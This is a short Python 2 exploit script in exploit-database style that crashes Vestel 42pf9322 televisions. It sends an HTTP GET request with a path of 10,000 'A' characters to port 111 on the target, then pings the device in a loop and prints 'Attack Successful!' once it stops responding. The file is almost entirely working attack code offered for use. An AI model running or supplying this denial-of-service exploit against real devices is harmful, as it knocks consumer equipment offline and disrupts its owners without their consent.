#!/usr/bin/python

# Exploit Title: Vestel TV Denial of Service (DoS) Attack
# Exploit Author: HackerSofi - hackersofi@gmail.com 
# Date: 12/09/2013
# CVE Number: 
# Vendor Homepage: http://www.vestel.com/
# Description: Some TV's Has Communication Port. Vestel 42pf9322 Models TV Using Port 0f 111 For Network Communications. 
#              If You Launch An Attack 0n The Communication Port, Tv System Will Be Crashes. 
# Special Thanks : DaTaMaN

 
import httplib
import sys
import os

print "  ***************************************************************************************"
print "   Author: HackerSofi - hackersofi@gmail.com \n"
print "   Exploit: Denial of Service (DoS) attack\n"
print "   Description:\n"
print "   Some TV's Has Communication Port. Vestel 42pf9322 Models TV Using Port 0f 111 For Network Communications. "
print "   If You Launch An Attack 0n The Communication Port, Tv System Will Be Crashes.\n "
print "   Special Thanks : DaTaMaN "
print "  ***************************************************************************************\n"

# Sends The Request
print "  Sending The Request...\n"
conn = httplib.HTTPConnection(sys.argv[1],111)
conn.request("GET", "A"*10000)
conn.close()

# Checks The Response
print "  Checking The Status... (CTRL+Z to stop)\n"
response = 0
while response == 0:
  response = os.system("ping -c 1 " + sys.argv[1] + "> /dev/null 2>&1")
  if response != 0:
    print "  Attack Successful!\n"